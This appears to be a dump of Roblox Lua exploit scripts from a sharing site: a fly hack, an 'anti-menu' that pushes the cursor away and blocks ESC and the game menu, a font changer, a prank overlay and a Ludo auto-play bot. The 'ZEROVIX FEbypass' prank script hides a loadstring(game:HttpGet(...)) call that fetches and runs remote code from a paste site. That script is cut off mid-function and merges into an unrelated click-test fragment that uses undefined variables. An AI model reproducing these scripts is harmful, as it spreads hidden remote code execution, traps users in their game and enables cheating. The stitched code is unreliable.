scripts.title: SAR FLY GUI V1 SCRIPT | OPEN SOURCE | KEYLESS | FREE
scripts.script:
local speed = 50
local step = 10
local maxSpeed = 100000
local plrs = game:GetService("Players")
local rs = game:GetService("RunService")
local uis = game:GetService("UserInputService")
local lp = plrs.LocalPlayer
local parent = (gethui and gethui()) or game:GetService("CoreGui")
if not pcall(function() return parent.Name end) then
    parent = lp:WaitForChild("PlayerGui")
end
for _, v in ipairs({"SARFlyGuiV1", "FlyGui"}) do
    if parent:FindFirstChild(v) then parent[v]:Destroy() end
end
local function new(class, props, par)
    local o = Instance.new(class)
    for k, v in pairs(props) do o[k] = v end
    o.Parent = par
    return o
end
local function round(o, r)
    new("UICorner", {CornerRadius = UDim.new(0, r or 6)}, o)
end
local gui = new("ScreenGui", {Name = "SARFlyGuiV1", ResetOnSpawn = false}, parent)
local main = new("Frame", {
    Size = UDim2.fromOffset(200, 160),
    Position = UDim2.new(0, 40, 0.4, 0),
    BackgroundColor3 = Color3.fromRGB(20, 20, 24),
    BorderSizePixel = 0,
    Active = true,
}, gui)
round(main, 8)
local bar = new("TextLabel", {
    Size = UDim2.new(1, 0, 0, 26),
    BackgroundColor3 = Color3.fromRGB(32, 32, 38),
    BorderSizePixel = 0,
    Text = "  SAR Fly Gui V1",
    TextXAlignment = Enum.TextXAlignment.Left,
    TextColor3 = Color3.fromRGB(235, 235, 235),
    Font = Enum.Font.GothamBold,
    TextSize = 13,
}, main)
round(bar, 8)
local function btn(text, x, y, w, h, col, par)
    local b = new("TextButton", {
        Text = text,
        Position = UDim2.new(0, x, 0, y),
        Size = UDim2.fromOffset(w, h),
        BackgroundColor3 = col or Color3.fromRGB(48, 48, 58),
        TextColor3 = Color3.new(1, 1, 1),
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        BorderSizePixel = 0,
    }, par or main)
    round(b)
    return b
end
local flyBtn = btn("Fly: OFF", 10, 34, 180, 30, Color3.fromRGB(160, 55, 55))
local minus = btn("-", 10, 72, 36, 28)
local plus = btn("+", 154, 72, 36, 28)
local upBtn = btn("Up", 10, 112, 85, 32)
local downBtn = btn("Down", 105, 112, 85, 32)
local box = new("TextBox", {
    Position = UDim2.fromOffset(52, 72),
    Size = UDim2.fromOffset(96, 28),
    BackgroundColor3 = Color3.fromRGB(32, 32, 38),
    TextColor3 = Color3.new(1, 1, 1),
    Text = tostring(speed),
    Font = Enum.Font.Gotham,
    TextSize = 13,
    ClearTextOnFocus = false,
    BorderSizePixel = 0,
}, main)
round(box)
local closeBtn = btn("X", 170, 3, 22, 20, Color3.fromRGB(180, 50, 50))
local minBtn = btn("-", 144, 3, 22, 20, Color3.fromRGB(60, 60, 75))
closeBtn.ZIndex = 5
minBtn.ZIndex = 5
local small = false
minBtn.MouseButton1Click:Connect(function()
    small = not small
    for _, v in ipairs(main:GetChildren()) do
        if v:IsA("GuiObject") and v ~= bar and v ~= minBtn and v ~= closeBtn then
            v.Visible = not small
        end
    end
    main.Size = small and UDim2.fromOffset(200, 26) or UDim2.fromOffset(200, 160)
    minBtn.Text = small and "+" or "-"
end)
local dragging, dstart, dpos
bar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        dragging, dstart, dpos = true, i.Position, main.Position
        i.Changed:Connect(function()
            if i.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
uis.InputChanged:Connect(function(i)
    if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
        local d = i.Position - dstart
        main.Position = UDim2.new(dpos.X.Scale, dpos.X.Offset + d.X, dpos.Y.Scale, dpos.Y.Offset + d.Y)
    end
end)
local function setSpeed(n)
    n = tonumber(n)
    if n then speed = math.clamp(math.floor(n), 1, maxSpeed) end
    box.Text = tostring(speed)
end
box.FocusLost:Connect(function() setSpeed(box.Text) end)
plus.MouseButton1Click:Connect(function() setSpeed(speed + step) end)
minus.MouseButton1Click:Connect(function() setSpeed(speed - step) end)
local up, down = false, false
local function hold(b, f)
    b.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then f(true) end
    end)
    b.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then f(false) end
    end)
end
hold(upBtn, function(v) up = v end)
hold(downBtn, function(v) down = v end)
local flying = false
local bv, bg, loop
local function stop()
    flying = false
    if loop then loop:Disconnect() loop = nil end
    if bv then bv:Destroy() bv = nil end
    if bg then bg:Destroy() bg = nil end
    local c = lp.Character
    local hum = c and c:FindFirstChildOfClass("Humanoid")
    if hum then hum.PlatformStand = false end
    flyBtn.Text = "Fly: OFF"
    flyBtn.BackgroundColor3 = Color3.fromRGB(160, 55, 55)
end
local function start()
    local c = lp.Character
    local hum = c and c:FindFirstChildOfClass("Humanoid")
    local root = c and c:FindFirstChild("HumanoidRootPart")
    if not hum or not root then return end

    flying = true
    bv = new("BodyVelocity", {MaxForce = Vector3.new(1e9, 1e9, 1e9), Velocity = Vector3.zero}, root)
    bg = new("BodyGyro", {MaxTorque = Vector3.new(1e9, 1e9, 1e9), P = 9e4, CFrame = root.CFrame}, root)
    hum.PlatformStand = true
    flyBtn.Text = "Fly: ON"
    flyBtn.BackgroundColor3 = Color3.fromRGB(55, 150, 75)

    loop = rs.RenderStepped:Connect(function()
        local ch = lp.Character
        local h = ch and ch:FindFirstChildOfClass("Humanoid")
        local r = ch and ch:FindFirstChild("HumanoidRootPart")
        if not h or not r or not bv or not bg then return stop() end

        local cf = workspace.CurrentCamera.CFrame
        local m = cf:VectorToObjectSpace(h.MoveDirection)
        local dir = cf.LookVector * -m.Z + cf.RightVector * m.X

        local y = 0
        if up or uis:IsKeyDown(Enum.KeyCode.Space) then y = y + 1 end
        if down or uis:IsKeyDown(Enum.KeyCode.LeftShift) or uis:IsKeyDown(Enum.KeyCode.Q) then y = y - 1 end
        dir = dir + Vector3.new(0, y, 0)

        bv.Velocity = dir.Magnitude > 0.01 and dir.Unit * speed or Vector3.zero
        bg.CFrame = CFrame.new(r.Position, r.Position + cf.LookVector)
    end)
end
local function toggle()
    if flying then stop() else start() end
end
flyBtn.MouseButton1Click:Connect(toggle)
closeBtn.MouseButton1Click:Connect(function()
    stop()
    gui:Destroy()
end)
uis.InputBegan:Connect(function(i, gp)
    if gp or not gui.Parent then return end
    if i.KeyCode == Enum.KeyCode.F then toggle() end
end)
lp.CharacterAdded:Connect(function()
    if gui.Parent then stop() end
end)

scripts.title: anti menu
scripts.script:
-- SWILL Anti-Menu v5.0 – Xeno Edition + ESC Block
-- (c) Swill Way, 2026

local Players              = game:GetService("Players")
local UserInputService     = game:GetService("UserInputService")
local RunService           = game:GetService("RunService")
local TweenService         = game:GetService("TweenService")
local VirtualInputManager  = game:GetService("VirtualInputManager")
local GuiService           = game:GetService("GuiService")

local player    = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local ZONE_SIZE  = 90
local PUSH_FORCE = 350
local COOLDOWN   = 1.0

-- ===== ДВИЖЕНИЕ КУРСОРА =====
local function moveCursor(dx, dy)
    if mousemoverel then
        if pcall(mousemoverel, dx, dy) then return true end
    end
    if Input and Input.MouseMoveRel then
        if pcall(function() Input.MouseMoveRel(dx, dy) end) then return true end
    end
    if pcall(function()
        local c = UserInputService:GetMouseLocation()
        VirtualInputManager:SendMouseMoveEvent(Vector2.new(c.X+dx, c.Y+dy), false, game)
    end) then return true end
    local mouse = player:GetMouse()
    if mouse and mouse.MoveRelative then
        if pcall(function() mouse:MoveRelative(dx, dy) end) then return true end
    end
    return false
end

local function pushFromCorner()
    local cursor = UserInputService:GetMouseLocation()
    local dir = Vector2.new(cursor.X, cursor.Y)
    if dir.Magnitude < 1 then dir = Vector2.new(1, 1) end
    dir = dir.Unit
    local target = Vector2.new(dir.X * PUSH_FORCE, dir.Y * PUSH_FORCE)
    local vp = workspace.CurrentCamera.ViewportSize
    target = Vector2.new(math.clamp(target.X,150,vp.X-20), math.clamp(target.Y,150,vp.Y-20))
    local dx = target.X - cursor.X
    local dy = target.Y - cursor.Y
    for _ = 1, 4 do
        moveCursor(dx, dy)
        task.wait()
    end
    return true
end

-- ===== НАДПИСЬ "НЕТ" =====
local gui = Instance.new("ScreenGui")
gui.Name = "SWILL_AntiMenu"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 9999
gui.Parent = playerGui

local noLabel = Instance.new("TextLabel")
noLabel.Size = UDim2.new(0, 450, 0, 160)
noLabel.Position = UDim2.new(0.5, -225, 0.5, -80)
noLabel.BackgroundColor3 = Color3.new(0, 0, 0)
noLabel.BackgroundTransparency = 0.3
noLabel.Text = "НЕТ"
noLabel.TextColor3 = Color3.new(1, 0, 0)
noLabel.TextScaled = true
noLabel.Font = Enum.Font.FredokaOne
noLabel.TextStrokeTransparency = 0
noLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
noLabel.Visible = false
noLabel.ZIndex = 100
noLabel.Parent = gui

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.new(1, 1, 1)
stroke.Thickness = 5
stroke.Parent = noLabel

local lastTriggered = 0
local function showNo()
    local now = tick()
    if now - lastTriggered < COOLDOWN then return end
    lastTriggered = now
    noLabel.Visible = true
    noLabel.TextTransparency = 0
    noLabel.TextStrokeTransparency = 0
    noLabel.BackgroundTransparency = 0.3
    noLabel.Position = UDim2.new(0.5, -225+math.random(-20,20), 0.5, -80+math.random(-20,20))
    task.spawn(function()
        task.wait(0.8)
        local tw = TweenService:Create(noLabel,
            TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {TextTransparency=1, TextStrokeTransparency=1, BackgroundTransparency=1})
        tw:Play(); tw.Completed:Wait(); noLabel.Visible = false
    end)
end

-- ===== ОСНОВНОЙ ЦИКЛ =====
RunService.RenderStepped:Connect(function()
    local cursor = UserInputService:GetMouseLocation()
    if cursor.X <= ZONE_SIZE and cursor.Y <= ZONE_SIZE then
        if pushFromCorner() then showNo() end
    end
end)

task.spawn(function()
    while task.wait(0.01) do
        local cursor = UserInputService:GetMouseLocation()
        if cursor.X <= ZONE_SIZE and cursor.Y <= ZONE_SIZE then
            pushFromCorner()
        end
    end
end)

-- ===== КЛИКИ =====
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        local pos = input.Position
        if pos.X <= ZONE_SIZE and pos.Y <= ZONE_SIZE then
            pushFromCorner(); showNo()
        end
    end
end)

-- ===== ESC → ЗАКРЫТИЕ ROBLOX МЕНЮ =====
local menuBlockEnabled = true

GuiService.MenuOpened:Connect(function()
    if not menuBlockEnabled then return end
    task.spawn(function()
        task.wait(0.01)
        pcall(function() GuiService:SetMenuIsOpen(false) end)
    end)
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if input.KeyCode == Enum.KeyCode.Escape then
        if not menuBlockEnabled then return end
        task.spawn(function()
            task.wait(0.02)
            pcall(function() GuiService:SetMenuIsOpen(false) end)
            task.wait(0.05)
            pcall(function()
                if GuiService.MenuIsOpen then
                    VirtualInputManager:SendKeyEvent(true,  Enum.KeyCode.Escape, false, game)
                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, game)
                end
            end)
        end)
    end
end)

pcall(function()
    game:GetService("ContextActionService"):BindActionAtPriority(
        "SWILL_BlockESC",
        function(_, state)
            if state == Enum.UserInputState.Begin then
                return Enum.ContextActionResult.Sink
            end
            return Enum.ContextActionResult.Pass
        end,
        false, 9999, Enum.KeyCode.Escape
    )
end)

_G.SWILL_ToggleMenuBlock = function(state)
    menuBlockEnabled = state
    print("[SWILL] Menu block: " .. (state and "ON" or "OFF"))
end

print("[SWILL] Anti-Menu v5.0 активен! ESC заблокирован.")

scripts.title: Minecraft Font
scripts.script:
-- [[ MINECRAFT FONT CHANGER - SAFE VERSION ]] --
-- Ganti font jadi Minecraft tanpa bikin layout berantakan

if _G.MinecraftSafe then pcall(function() _G.MinecraftSafe:Stop() end) end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

-- ============================================================================
-- CONFIG
-- ============================================================================
local MC_FONT = Enum.Font.Arcade

-- Daftar nama GUI yang DI-SKIP (biar gak berantakan)
local SKIP_NAMES = {
    ["Chat"] = true,
    ["RobloxChat"] = true,
    ["TopBarApp"] = true,
    ["SettingsMenu"] = true,
    ["RobloxGui"] = true,
}

-- Scan delay (makin gede, makin ringan)
local SCAN_DELAY = 1

-- ============================================================================
-- STATE
-- ============================================================================
local running = true
local changedCount = 0
local changedList = {}

-- ============================================================================
-- CEK APAKAH OBJECT HARUS DI-SKIP
-- ============================================================================
local function shouldSkip(obj)
    local current = obj
    local depth = 0
    while current and depth < 5 do
        if SKIP_NAMES[current.Name] then
            return true
        end
        current = current.Parent
        depth = depth + 1
    end
    return false
end

-- ============================================================================
-- GANTI FONT (TANPA UBAH SIZE)
-- ============================================================================
local function changeFont(obj)
    if not obj or not obj.Parent then return end

    -- Cek apakah ini text object
    local isTextObj = false
    pcall(function()
        isTextObj = obj:IsA("TextLabel") 
            or obj:IsA("TextButton") 
            or obj:IsA("TextBox")
    end)

    if not isTextObj then return end

    -- Skip kalo di daftar skip
    if shouldSkip(obj) then return end

    -- Skip kalo udah pake font Minecraft
    pcall(function()
        if obj.Font == MC_FONT then return end

        -- Simpen original font (buat restore)
        if not obj:GetAttribute("OriginalFont") then
            obj:SetAttribute("OriginalFont", obj.Font.Name)
        end

        -- GANTI FONT DOANG — JANGAN UBAH SIZE/LAYOUT
        obj.Font = MC_FONT
        changedCount = changedCount + 1
        table.insert(changedList, obj)
    end)
end

-- ============================================================================
-- SCAN SEMUA GUI
-- ============================================================================
local function scanAll()
    -- 1. PlayerGui (GUI game)
    pcall(function()
        local pg = LP:FindFirstChild("PlayerGui")
        if pg then
            for _, obj in pairs(pg:GetDescendants()) do
                changeFont(obj)
            end
        end
    end)

    -- 2. Workspace (BillboardGui / nametag)
    pcall(function()
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then
                for _, child in pairs(obj:GetDescendants()) do
                    changeFont(child)
                end
            end
        end
    end)
end

-- ============================================================================
-- LOOP SCAN
-- ============================================================================
task.spawn(function()
    while running do
        scanAll()
        task.wait(SCAN_DELAY)
    end
end)

-- ============================================================================
-- FUNGSI RESTORE (balikin ke font asli)
-- ============================================================================
local function restoreAll()
    for _, obj in pairs(changedList) do
        pcall(function()
            if obj and obj.Parent then
                local origName = obj:GetAttribute("OriginalFont")
                if origName then
                    -- Balikin font asli
                    for _, font in pairs(Enum.Font:GetEnumItems()) do
                        if font.Name == origName then
                            obj.Font = font
                            break
                        end
                    end
                    obj:SetAttribute("OriginalFont", nil)
                end
            end
        end)
    end
    changedList = {}
    changedCount = 0
end

-- ============================================================================
-- API
-- ============================================================================
_G.MinecraftSafe = {
    Stop = function()
        running = false
        print("⛏ Minecraft Font stopped.")
    end,
    Restore = function()
        restoreAll()
        print("⛏ Semua font dibalikin ke aslinya.")
    end,
    Status = function()
        return running, changedCount
    end,
    SkipGUI = function(name)
        SKIP_NAMES[name] = true
        print("⛏ Skip GUI: " .. name)
    end,
}

print("⛏ MINECRAFT FONT - SAFE VERSION LOADED!")
print("📌 Font diganti tanpa ubah size/layout")
print("📌 Kalo ada GUI berantakan, ketik: _G.MinecraftSafe.SkipGUI('NamaGUI')")
print("📌 Buat balikin: _G.MinecraftSafe.Restore()")
print("📌 Buat matiin: _G.MinecraftSafe.Stop()")

scripts.script:

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local USER_IDS = {7952378276, 8839071737}

local DANCE_ANIMATION_IDS = {
	"rbxassetid://121924019901219",
	"rbxassetid://96566050844094"
}

local FONTS = {
	Enum.Font.GothamBold,
	Enum.Font.FredokaOne,
	Enum.Font.SourceSansBold,
	Enum.Font.Antique,
	Enum.Font.Bangers,
	Enum.Font.SciFi,
	Enum.Font.Arcade,
	Enum.Font.LuckiestGuy,
	Enum.Font.SpecialElite,
	Enum.Font.Cartoon
}

local function madeByZoop(plr)
	local playerGui = plr:WaitForChild("PlayerGui")

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "ZeroGuiDisplay"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 9999
	screenGui.Parent = playerGui

	local bg = Instance.new("Frame")
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	bg.BackgroundTransparency = 0.4
	bg.BorderSizePixel = 0
	bg.Parent = screenGui

	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://111743516263186"
	sound.Volume = 10
	sound.PlaybackSpeed = 1
	sound.Looped = false
	sound.Parent = bg

	local distortion = Instance.new("DistortionSoundEffect")
	distortion.Level = 0.7
	distortion.Parent = sound

	sound:Play()

	sound.Ended:Connect(function()
		if screenGui then
			screenGui:Destroy()
		end
	end)

	task.delay(99999, function()
		if screenGui and screenGui.Parent then
			screenGui:Destroy()
		end
	end)

	local viewport = Instance.new("ViewportFrame")
	viewport.Size = UDim2.new(1, 0, 0.7, 0)
	viewport.Position = UDim2.new(0, 0, 0.15, 0)
	viewport.BackgroundTransparency = 1
	viewport.ZIndex = 10
	viewport.Parent = bg

	local worldModel = Instance.new("WorldModel")
	worldModel.Parent = viewport

	local camera = Instance.new("Camera")
	camera.FieldOfView = 45
	camera.Parent = viewport
	viewport.CurrentCamera = camera

	camera.CFrame = CFrame.new(
		Vector3.new(0, 2.5, 8.5),
		Vector3.new(0, 1.5, 0)
	)

	local charData = {
		{userId = USER_IDS[1], x = 4, facing = math.rad(90)},
		{userId = USER_IDS[2], x = -4, facing = math.rad(-90)}
	}

	for _, data in ipairs(charData) do
		pcall(function()
			local description = Players:GetHumanoidDescriptionFromUserId(data.userId)

			local characterModel =
				Players:CreateHumanoidModelFromDescription(
					description,
					Enum.HumanoidRigType.R15
				)

			characterModel.Parent = worldModel

			characterModel:SetPrimaryPartCFrame(
				CFrame.new(data.x, 1, 0) *
				CFrame.Angles(0, data.facing, 0)
			)

			local humanoid =
				characterModel:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.RigType = Enum.HumanoidRigType.R15

				local animIndex =
					(data.userId == USER_IDS[1]) and 1 or 2

				local animator =
					humanoid:FindFirstChildOfClass("Animator")
					or Instance.new("Animator", humanoid)

				local animation = Instance.new("Animation")
				animation.AnimationId =
					DANCE_ANIMATION_IDS[animIndex]

				local track = animator:LoadAnimation(animation)
				track.Looped = true
				track:Play()

				task.spawn(function()
					while characterModel.Parent do
						task.wait(math.random(2, 5))

						local currentPos =
							characterModel:GetPrimaryPartCFrame()

						local newPos =
							currentPos +
							CFrame.new(
								data.x > 0 and -0.1 or 0.1,
								0,
								0
							)

						characterModel:SetPrimaryPartCFrame(newPos)
					end
				end)
			end
		end)
	end

	local entityText = Instance.new("TextLabel")
	entityText.Size = UDim2.new(1, 0, 0.15, 0)
	entityText.Position = UDim2.new(0, 0, 0.425, 0)
	entityText.BackgroundTransparency = 1

	entityText.Text =
		"ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM ZEROVIX FEbypass TEAM"

	entityText.TextColor3 = Color3.fromRGB(0, 0, 0)
	entityText.TextScaled = true
	entityText.Font = Enum.Font.Bangers
	entityText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	entityText.TextStrokeTransparency = 0.3
	entityText.ZIndex = 1
	entityText.Parent = bg

	local hintTop = Instance.new("TextLabel")
	hintTop.Size = UDim2.new(1, 0, 0.08, 0)
	hintTop.Position = UDim2.new(0, 0, 0.05, 0)
	hintTop.BackgroundTransparency = 1
	hintTop.Text = "only FEbypass"
	hintTop.TextColor3 = Color3.fromRGB(255, 255, 255)
	hintTop.TextScaled = true
	hintTop.Font = Enum.Font.GothamBold
	hintTop.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	hintTop.TextStrokeTransparency = 0.5
	hintTop.ZIndex = 1
	hintTop.Parent = bg

	local hintBottom = Instance.new("TextLabel")
	hintBottom.Size = UDim2.new(1, 0, 0.08, 0)
	hintBottom.Position = UDim2.new(0, 0, 0.87, 0)
	hintBottom.BackgroundTransparency = 1
	hintBottom.Text = "FEbypass FEbypass FEbypass FEbypass FEbypass FEbypass "
	hintBottom.TextColor3 = Color3.fromRGB(255, 255, 255)
	hintBottom.TextScaled = true
	hintBottom.Font = Enum.Font.GothamBold
	hintBottom.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	hintBottom.TextStrokeTransparency = 0.5
	hintBottom.ZIndex = 1
	hintBottom.Parent = bg

	task.spawn(function()
		local fonts = {
			Enum.Font.Bangers,
			Enum.Font.SciFi,
			Enum.Font.Arcade,
			Enum.Font.GothamBold
		}

		while screenGui and screenGui.Parent do
			entityText.Font = fonts[math.random(1, #fonts)]
			entityText.TextTransparency = math.random(0, 5) / 10
			entityText.TextSize = math.random(80, 120)
			entityText.Rotation = math.random(-3, 3)
			hintTop.TextTransparency = math.random(0, 3) / 10
			hintBottom.TextTransparency = math.random(0, 3) / 10
			task.wait(0.1)
		end
	end)

	task.spawn(function()
		pcall(function()
			loadstring(game:HttpGet(
				"https://pastefy.app/t51azaDx/raw"
			))()
		end)
	end)
end

for _, plr in ipairs(Players:GetPlayers()) do
	task.spawn(madeByZoop, plr)
end

Players.PlayerAdded:Connect(function(plr)
	task.spawn(madeByZoop, plr)

button.Size = UDim2.new(0.8, 0, 0, 45)
button.Position = UDim2.new(0.1, 0, 0, 65)
button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button.BorderColor3 = Color3.fromRGB(255, 255, 255)
button.BorderSizePixel = 1
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Text = "CLIQUE AQUI"
button.Font = Enum.Font.GothamBold
button.TextSize = 14
button.Parent = menu

local count = 0

button.Activated:Connect(function()
    count += 1
    button.Text = "CLIQUES: " .. count
end)

-- ARRASTAR O QUADRADO NO PC E CELULAR
local dragging = false
local pressPosition
local buttonStartPosition
local activeInput
local moved = false
local dragThreshold = 8

toggle.InputBegan:Connect(function(input)
    if input.UserInputType ~= Enum.UserInputType.Touch
    and input.UserInputType ~= Enum.UserInputType.MouseButton1 then
        return
    end

    dragging = true
    moved = false
    activeInput = input
    pressPosition = input.Position
    buttonStartPosition = toggle.Position
end)

UIS.InputChanged:Connect(function(input)
    if not dragging then
        return
    end

    local validInput =
        input.UserInputType == Enum.UserInputType.MouseMovement
        or (input.UserInputType == Enum.UserInputType.Touch
        and activeInput == input)

    if validInput then
        local delta = input.Position - pressPosition

        if delta.Magnitude > dragThreshold then
            moved = true
        end

        if moved then
            toggle.Position = UDim2.new(
                buttonStartPosition.X.Scale,
                buttonStartPosition.X.Offset + delta.X,
                buttonStartPosition.Y.Scale,
                buttonStartPosition.Y.Offset + delta.Y
            )
        end
    end
end)

UIS.InputEnded:Connect(function(input)
    if input == activeInput
    or input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
        activeInput = nil
    end
end)

-- ABRIR E FECHAR COM UM TOQUE/CLIQUE
local lastPressPosition
local wasDragging = false

toggle.Activated:Connect(function()
    if not moved then
        menu.Visible = not menu.Visible
    end
end)

print("click TEST carregado!")

scripts.script:
-- =============================================
-- LUDO ARENA: AUTO ROLL & SMART BEST-MOVE BOT
-- =============================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local PlayerScripts = LocalPlayer:WaitForChild("PlayerScripts")
local LudoFolder = PlayerScripts:WaitForChild("Ludo")

local Store = require(LudoFolder:WaitForChild("Store"))
local Net = require(ReplicatedStorage.Ludo.Modules.Net)
local MoveEval = require(ReplicatedStorage.Ludo.Modules.MoveEval)

local Config = {
    AutoRoll = true,
    AutoMove = true,
    MoveDelay = 0.4 -- Delay tipis biar gerakannya mulus & natural
}

-- Buat UI Toggle di Layar
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LudoBotUI"
ScreenGui.ResetOnSpawn = false

local targetParent = (gethui and gethui()) or CoreGui or LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.Parent = targetParent

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 190, 0, 110)
Frame.Position = UDim2.new(0.02, 0, 0.4, 0)
Frame.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 26)
Title.BackgroundTransparency = 1
Title.Text = "🎲 LUDO SMART BOT"
Title.TextColor3 = Color3.fromRGB(255, 215, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 13
Title.Parent = Frame

local function createToggle(name, yPos, defaultState, callback)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(0.9, 0, 0, 30)
    Btn.Position = UDim2.new(0.05, 0, 0, yPos)
    Btn.BackgroundColor3 = defaultState and Color3.fromRGB(46, 139, 87) or Color3.fromRGB(178, 34, 34)
    Btn.Text = name .. ": " .. (defaultState and "ON" or "OFF")
    Btn.TextColor3 = Color3.new(1, 1, 1)
    Btn.Font = Enum.Font.GothamSemibold
    Btn.TextSize = 12
    Btn.AutoButtonColor = false
    Btn.Parent = Frame

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = Btn

    local state = defaultState
    Btn.MouseButton1Click:Connect(function()
        state = not state
        Btn.BackgroundColor3 = state and Color3.fromRGB(46, 139, 87) or Color3.fromRGB(178, 34, 34)
        Btn.Text = name .. ": " .. (state and "ON" or "OFF")
        callback(state)
    end)
end

createToggle("Auto Roll", 32, Config.AutoRoll, function(val) Config.AutoRoll = val end)
createToggle("Auto Best Move", 68, Config.AutoMove, function(val) Config.AutoMove = val end)

-- Loop Pengendali Permainan
task.spawn(function()
    while task.wait(0.2) do
        local screen = Store.get("screen")
        if screen == "MATCH" then
            -- 1. Auto Roll bila giliran kita
            if Config.AutoRoll and Store.canRoll() then
                Net.event("RequestRoll"):FireServer()
                task.wait(0.5)
            end

            -- 2. Auto Best Move saat memilih pion
            if Config.AutoMove and Store.canPick() then
                local match = Store.get("match")
                local localSeat = Store.get("localSeat")
                if match and match.dice then
                    local moves = MoveEval.all(match, localSeat, match.dice)
                    if moves and #moves > 0 then
                        local bestMove = moves[1]
                        task.wait(Config.MoveDelay)
                        Net.event("RequestMove"):FireServer(bestMove.owner, bestMove.token)
                        task.wait(0.6)
                    end
                end
            end
        end
    end
end)

print("[LudoBot] Berhasil diaktifkan!")
